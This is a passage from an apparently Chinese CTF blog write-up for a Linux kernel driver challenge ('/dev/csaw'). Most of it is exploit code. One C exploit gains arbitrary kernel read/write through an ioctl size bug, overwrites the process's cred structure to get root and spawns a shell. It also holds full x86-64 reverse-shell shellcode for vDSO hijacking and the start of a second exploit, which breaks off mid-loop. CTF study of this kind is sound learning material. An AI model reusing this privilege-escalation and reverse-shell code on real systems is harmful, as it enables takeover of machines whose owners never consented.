class="title">alloc_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> buf_size;</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">grow_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">loff_t</span> index;</span><br><span class="line">    <span class="keyword">int</span> whence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> cred_addr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0L</span>L,<span class="number">2</span>,<span class="number">0L</span>L);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> fake_str[<span class="number">16</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(fake_str,<span class="string">"this_is_xxrw..."</span>);</span><br><span class="line">    prctl(PR_SET_NAME,fake_str);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/csaw"</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Open fail..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> <span class="title">alloc_channel</span>;</span></span><br><span class="line">    alloc_channel.buf_size = <span class="number">0x100</span>;</span><br><span class="line">    alloc_channel.id = <span class="number">-1</span>;</span><br><span class="line">    ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;alloc_channel);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]This is our channel_id: %d\n"</span>,alloc_channel.id);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> <span class="title">shrink_channel</span>;</span></span><br><span class="line">    shrink_channel.id = alloc_channel.id;</span><br><span class="line">    shrink_channel.size = <span class="number">0x100</span>+<span class="number">1</span>;</span><br><span class="line">    ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;shrink_channel);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[:)]Now we can r&amp;w any where we want!!!"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//char buf[0x1000];</span></span><br><span class="line">    <span class="keyword">char</span>* buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">size_t</span> target_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_channel</span>;</span></span><br><span class="line">    <span class="keyword">size_t</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> cred = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> real_cred = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> task_struct_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> addr = <span class="number">0xffff880000000000</span>;addr&lt;<span class="number">0xffffc80000000000</span>;addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line">        seek_channel.id = alloc_channel.id;</span><br><span class="line">        seek_channel.index = addr<span class="number">-0x10</span>;</span><br><span class="line">        seek_channel.whence = SEEK_SET;</span><br><span class="line">        ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel);</span><br><span class="line"></span><br><span class="line">        read_channel.id = alloc_channel.id;</span><br><span class="line">        read_channel.buf = buf;</span><br><span class="line">        read_channel.count = <span class="number">0x1000</span>;</span><br><span class="line">        ioctl(fd,CSAW_READ_CHANNEL,&amp;read_channel);</span><br><span class="line"></span><br><span class="line">        result = memmem(buf,<span class="number">0x1000</span>,fake_str,<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">if</span>(result)&#123;</span><br><span class="line">            cred = *(<span class="keyword">size_t</span>*)(result<span class="number">-8</span>);</span><br><span class="line">            real_cred = *(<span class="keyword">size_t</span>*)(result<span class="number">-0x10</span>);</span><br><span class="line">            <span class="keyword">if</span>(cred == real_cred)&#123;</span><br><span class="line">				target_addr = addr + (result-(<span class="keyword">size_t</span>)buf);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"[:)]target_addr =  %p\n"</span>,target_addr);</span><br><span class="line">                task_struct_addr = target_addr - <span class="number">0x9a8</span>;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"[:)]task_struct_addr = %p\n"</span>,task_struct_addr);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"[:)]cred_addr = %p\n"</span>,real_cred);</span><br><span class="line">                cred_addr = real_cred;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_channel</span>;</span></span><br><span class="line">    char zero = '\x00';</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">28</span>;i++)&#123;</span><br><span class="line">        seek_channel.id = alloc_channel.id;</span><br><span class="line">        seek_channel.index = cred_addr<span class="number">-0x10</span>+i;</span><br><span class="line">        seek_channel.whence = SEEK_SET;</span><br><span class="line">        ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel);</span><br><span class="line"></span><br><span class="line">        write_channel.id = alloc_channel.id;</span><br><span class="line">        write_channel.buf = &amp;zero;</span><br><span class="line">        write_channel.count = <span class="number">1</span>; </span><br><span class="line">        ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_channel);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:)]Root now!!!"</span>);</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Not root..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="解法二：-2"><a href="#解法二：-2" class="headerlink" title="解法二："></a>解法二：</h2><p> 劫持<code>vSDO</code></p>
<h3 id="反弹shell："><a href="#反弹shell：" class="headerlink" title="反弹shell："></a>反弹shell：</h3><p>这道题的反弹<code>shell</code>让我对内核有了更深的理解：</p>
<p>反弹<code>shell</code>就是别的进程打开了一个<code>shell</code>，本来他是可以正常输入命令与<code>kernel</code>交互的，但是我们把其交互的输入输出全部重定向到了我们当前的进程，等于我们控制了一个傀儡进程，我们控制傀儡进程与<code>kernel</code>交互的输入，获取交互后<code>kernel</code>反馈回的输出，也就是实际上是这个傀儡进程在与<code>kernel</code>交互，我们在幕后控制其话语权，<strong>所以若这个傀儡进程为<code>root</code>权限，则等于我们间接性的获得了以<code>root</code>权限与<code>kernel</code>交互的能力。等于完成了提权。</strong></p>
<p>基本流程为：</p>
<p>先用<code>getuid</code>系统调用返回值是否为0来判断当前进程是否为<code>root</code>进程，若不是则会调用<code>gettimeofday</code>系统调用继续正常运行。若为<code>root</code>权限进程，则用<code>fork()</code>产生一个子进程，在子进程中进行正常的反弹<code>shell</code>，在父进程中仍然调用<code>gettimeofday</code>，这种反弹<code>shell</code>触发比较稳定，不会扰乱某<code>root</code>进程正常的执行流程。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">nop</span><br><span class="line">push rbx</span><br><span class="line">xor rax,rax</span><br><span class="line">mov al, 0x66</span><br><span class="line">syscall #check uid</span><br><span class="line">xor rbx,rbx</span><br><span class="line">cmp rbx,rax</span><br><span class="line">jne emulate #If not root, only emulate.</span><br><span class="line"></span><br><span class="line">xor rax,rax</span><br><span class="line">mov al,0x39</span><br><span class="line">syscall #fork</span><br><span class="line">xor rbx,rbx</span><br><span class="line">cmp rax,rbx</span><br><span class="line">je connectback</span><br><span class="line"></span><br><span class="line">emulate:</span><br><span class="line">pop rbx</span><br><span class="line">xor rax,rax</span><br><span class="line">mov al,0x60</span><br><span class="line">syscall</span><br><span class="line">retq</span><br><span class="line"></span><br><span class="line">connectback:</span><br><span class="line">xor rdx,rdx</span><br><span class="line">pushq 0x1</span><br><span class="line">pop rsi</span><br><span class="line">pushq 0x2</span><br><span class="line">pop rdi</span><br><span class="line">pushq 0x29</span><br><span class="line">pop rax </span><br><span class="line">syscall #socket</span><br><span class="line"></span><br><span class="line">xchg rdi,rax</span><br><span class="line">push rax</span><br><span class="line">mov rcx, 0xfeffff80faf2fffd #NOT&apos;ed 127.0.0.1:3333</span><br><span class="line">not rcx</span><br><span class="line">push rcx</span><br><span class="line">mov rsi,rsp</span><br><span class="line">pushq 0x10</span><br><span class="line">pop rdx</span><br><span class="line">pushq 0x2a</span><br><span class="line">pop rax</span><br><span class="line">syscall #connect</span><br><span class="line"></span><br><span class="line">xor rbx,rbx</span><br><span class="line">cmp rax,rbx</span><br><span class="line">je sh</span><br><span class="line">xor rax,rax</span><br><span class="line">mov al,0xe7</span><br><span class="line">syscall #exit</span><br><span class="line"></span><br><span class="line">sh:</span><br><span class="line">nop</span><br><span class="line">pushq 0x3</span><br><span class="line">pop rsi</span><br><span class="line">duploop:</span><br><span class="line">pushq 0x21</span><br><span class="line">pop rax</span><br><span class="line">dec rsi</span><br><span class="line">syscall #dup</span><br><span class="line">jne duploop</span><br><span class="line"></span><br><span class="line">mov rbx,0xff978cd091969dd0 #NOT&apos;ed &quot;/bin/sh&quot;</span><br><span class="line">not rbx</span><br><span class="line">push rbx</span><br><span class="line">mov rdi,rsp</span><br><span class="line">push rax</span><br><span class="line">push rdi</span><br><span class="line">mov rsi,rsp</span><br><span class="line">xor rdx,rdx</span><br><span class="line">mov al,0x3b</span><br><span class="line">syscall #execve</span><br><span class="line">xor rax,rax</span><br><span class="line">mov al,0xe7</span><br><span class="line">syscall #exit</span><br></pre></td></tr></table></figure>
<h3 id="dump-vDSO："><a href="#dump-vDSO：" class="headerlink" title="dump_vDSO："></a>dump_vDSO：</h3><p><code>vDSO</code>是一块大小在<code>0x2000</code>以内的被映射到内存中的文件，里面含有四个函数/快速系统调用：<code>clock_gettime</code>，<code>gettimeofday</code>，<code>time</code>，<code>getcpu</code>。还含有四个字符串：<code>__vdso_clock_gettime</code>，<code>__vdso_gettimeofday</code>，<code>__vdso_time</code>，<code>__vdso_getcpu</code>。</p>
<p>我们的目标是获取到内核态中<code>vDSO</code>的地址。</p>
<p>可用如下程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> sysinfo_ehdr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"vDSO_addr = %p\n"</span>,sysinfo_ehdr);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> result = <span class="number">0</span>;</span><br><span class="line">	result = memmem(sysinfo_ehdr,<span class="number">0x1000</span>,<span class="string">"gettimeofday"</span>,<span class="number">12</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"result = %p\n"</span>,result);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"gettimeofday_offset = %p\n"</span>,result-sysinfo_ehdr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	if (sysinfo_ehdr!=0)&#123;</span></span><br><span class="line"><span class="comment">		for (int i=0;i&lt;0x2000;i+=1)&#123;</span></span><br><span class="line"><span class="comment">			printf("%02x ",*(unsigned char *)(sysinfo_ehdr+i));</span></span><br><span class="line"><span class="comment">		&#125;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段程序可以确定用户态的<code>vDSO</code>段地址，然后确定了<code>gettimeofday</code>这个字符串所在的偏移，再到内核中利用任意地址读对<code>0xffffffff80000000~0xffffffffa0000000</code>区域进行爆破，用上述程序得到的偏移<code>offset</code>进行检测：<code>if(!strcmp(&quot;gettimeofday&quot;,addr+offset))</code>，得到<code>vDSO</code>内核态基址之后，就可以在gdb中动态调试，用<code>dump memory</code>将其<code>dump</code>下来：<code>dump memory ./vDSO.dump 内核态vDSO基址 内核态vDSO基址+0x2000</code>。然后可以将<code>dump</code>下来的<code>vDSO.dump</code>文件放进ida或者用<code>objdump</code>查看其中函数代码段的偏移，在内核态将<code>shellcode</code>注入对应地址再到用户态调用即可。</p>
<p><img src="https://i.loli.net/2020/02/11/WhMCLxYzGQV1Smt.png" alt="x1.PNG"></p>
<h2 id="exp：-5"><a href="#exp：-5" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_IOCTL_BASE     0x77617363</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> buf_size;</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">grow_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">loff_t</span> index;</span><br><span class="line">    <span class="keyword">int</span> whence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_shellcode</span><span class="params">(<span class="keyword">char</span>* shellcode)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line">    <span class="keyword">if</span>(addr == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Get vSDO_addr in userspace fail..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[:)]vSDO_addr in userspace = %p\n"</span>,addr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(memmem(addr,<span class="number">0x1000</span>,shellcode,<span class="built_in">strlen</span>(shellcode)))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> vDSO_addr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0L</span>L,<span class="number">2</span>,<span class="number">0L</span>L);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/csaw"</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Open fail..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> <span class="title">alloc_channel</span>;</span></span><br><span class="line">    alloc_channel.buf_size = <span class="number">0x100</span>;</span><br><span class="line">    alloc_channel.id = <span class="number">-1</span>;</span><br><span class="line">    ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;alloc_channel);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]This is our channel_id: %d\n"</span>,alloc_channel.id);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> <span class="title">shrink_channel</span>;</span></span><br><span class="line">    shrink_channel.id = alloc_channel.id;</span><br><span class="line">    shrink_channel.size = <span class="number">0x100</span>+<span class="number">1</span>;</span><br><span class="line">    ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;shrink_channel);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[:)]Now we can r&amp;w any where we want!!!"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_channel</span>;</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> addr=<span class="number">0xffffffff80000000</span>;addr&lt;<span class="number">0xffffffffffffefff</span>;addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line">        seek_channel.id = 